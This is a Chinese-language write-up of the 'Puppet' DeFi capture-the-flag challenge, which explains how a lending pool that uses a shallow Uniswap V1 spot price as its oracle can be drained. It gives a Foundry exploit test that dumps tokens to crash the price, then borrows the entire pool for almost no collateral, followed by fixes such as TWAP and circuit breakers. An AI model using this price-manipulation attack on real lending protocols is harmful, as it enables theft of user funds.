# Puppet 

## 一、题目简述

题目存在一套借贷池合约 `PuppetPool`，用户可抵押 ETH 借贷 DVT 代币，借贷规则为：**抵押两倍代币价值的 ETH 作为抵押物**。借贷池无内置定价算法，完全依赖外部 Uniswap V1 交易对作为价格预言机。

基础环境参数：

- 借贷池初始存量：**100000 DVT**

- Uniswap V1 交易对流动性：**10 ETH + 10 DVT**（池子深度极低）

- 玩家初始资产：**25 ETH、1000 DVT**

解题目标：掏空借贷池内全部 DVT 代币，并将所有代币存入指定 recovery 回收账户。同时题目存在**隐藏限制**：玩家仅可执行一次链上交易（nonce=1），该规则仅能通过报错得知，未在题目描述中标注。

## 二、审计视角（脆弱细节）

### 1\. 核心高危漏洞：极简 AMM 瞬时价格作为预言机

借贷池自定义价格计算函数，直接读取 Uniswap V1 合约实时余额计算代币价格，无任何防护机制：

```solidity
function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

漏洞细节：价格计算公式完全依赖交易对实时余额，仅为瞬时快照，无时间加权、无滑点校验、无深度校验。攻击者可通过大额兑换瞬间篡改代币价格。

### 2\. 风控逻辑完全依赖外部可控价格

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}
```

漏洞细节：用户借贷所需抵押 ETH 金额，完全由可控的预言机价格决定。攻击者砸盘压低代币价格后，借贷所需抵押金近乎归零，可极低成本借走合约全部代币。

### 3\. 无任何价格熔断与风控兜底

借贷合约仅校验用户抵押 ETH 是否达标，未校验预言机价格合理性、未校验交易对流动性深度，无价格波动熔断、无借贷限额，完全信任外部 AMM 数据源。

## 三、开发者默认安全假设（误区）

1. **默认 AMM 价格天然可信**：开发者误以为去中心化交易所价格公允，忽略小深度池子极易被单次交易操纵。

2. **默认池子深度充足**：未考虑超低流动性交易对，大额兑换可直接击穿价格。

3. **默认两倍抵押足够安全**：忽略抵押金额由外部可控价格决定，抵押倍率风控形同虚设。

4. **隐藏业务限制未公示**：测试代码内置「玩家仅可发起一次交易」的校验，无题目说明，属于隐性考点。

## 四、同类项目通用审计盯点（重点）

1. **预言机选型必查**：借贷、清算类核心金融逻辑，禁止直接使用 Uniswap V1/V2 瞬时余额价格，极易引发价格操纵攻击。

2. **AMM 数据源校验**：使用 AMM 作为价格源时，必须校验交易对流动性深度，低深度池子不可作为价格预言机。

3. **必须引入 TWAP**：金融合约统一使用时间加权平均价格（TWAP），抹平瞬时交易带来的价格波动。

4. **多层风控兜底**：新增价格熔断、单次借贷限额、价格最大浮动比例限制，避免极端价格套利。

5. **关注隐性交易限制**：DeFi CTF 及真实项目中，需额外校验账户 nonce、交易次数、权限范围等隐性校验规则。

## 五、完整解题思路

1. **砸盘操纵价格**：玩家使用自身持有的 1000 DVT，在 Uniswap V1 池子完成代币兑换，利用池子极低流动性，将 DVT 代币价格砸至趋近于 0。

2. **降低抵押成本**：预言机读取篡改后的极低价格，借贷池计算出的抵押 ETH 金额大幅降低，玩家仅需少量 ETH 即可借贷大额代币。

3. **掏空借贷池资金**：调用 borrow 函数，一次性借走借贷池全部 100000 DVT。

4. **适配隐性校验规则**：通过设置账户 nonce 满足题目「单次交易」校验条件。

5. **完成通关要求**：将掏空的全部 DVT 代币转账至官方 recovery 回收账户。

## 六、报错复盘（完整记录）

### 报错1：OutOfFunds 资金不足

**报错原因**：仅转账 DVT 至 Uniswap 池子，未调用 swap 兑换函数，未真正篡改链上价格，抵押金额依旧极高，玩家 ETH 不足以完成抵押借贷。

**解决方案**：必须调用 `tokenToEthSwapInput` 完成真实兑换，击穿代币价格。

### 报错2：vm\.startPrank 重复覆盖报错

**报错原因**：重复调用 startPrank，Foundry 不支持未结束的 prank 二次覆盖。

**解决方案**：精简 prank 逻辑，依托测试自带 prank 环境，避免重复调用。

### 报错3：Player executed more than one tx: 0 != 1

**报错原因**：题目隐藏校验，要求玩家账户交易次数（nonce）必须为 1，Foundry 测试环境默认不会自动递增 nonce，导致校验失败。

**解决方案**：新增 `vm.setNonce(player, 1)` 手动适配题目隐性校验规则。

## 七、EXP

```solidity
function test_puppet() public checkSolvedByPlayer {
    // 题目隐藏校验：仅可执行一次交易
    vm.setNonce(player, 1); 

    // 1. 授权代币给uniswapV1交易所
    token.approve(address(uniswapV1Exchange), type(uint256).max);

    // 2. 砸盘：兑换全部个人DVT，击穿代币价格
    uniswapV1Exchange.tokenToEthSwapInput(
        PLAYER_INITIAL_TOKEN_BALANCE,
        1,
        block.timestamp + 1000
    );

    // 3. 计算掏空池子所需抵押ETH，借走全部DVT
    uint256 borrowAll = POOL_INITIAL_TOKEN_BALANCE;
    uint256 requiredCollateral = lendingPool.calculateDepositRequired(borrowAll);
    lendingPool.borrow{value: requiredCollateral}(borrowAll, player);

    // 4. 将全部代币转入回收账户，完成解题
    token.transfer(recovery, borrowAll);
}
```

## 八、合约修复方案

1. **替换预言机方案**：废弃瞬时余额定价，采用 Uniswap TWAP 时间加权平均价格，抵抗单次交易价格操纵。

2. **增加流动性校验**：预言机获取价格前，校验 AMM 交易对流动性深度，低深度数据源直接弃用、暂停借贷功能。

3. **新增价格风控**：设置代币价格上下限、单次价格浮动阈值，价格异常时触发熔断，暂停借贷业务。

4. **增加借贷限额**：限制单用户单次最大借贷额度，防止攻击者一次性掏空合约全部资金。

5. **多重价格交叉校验**：接入多个预言机数据源，多源价格比对，避免单一数据源被操控。
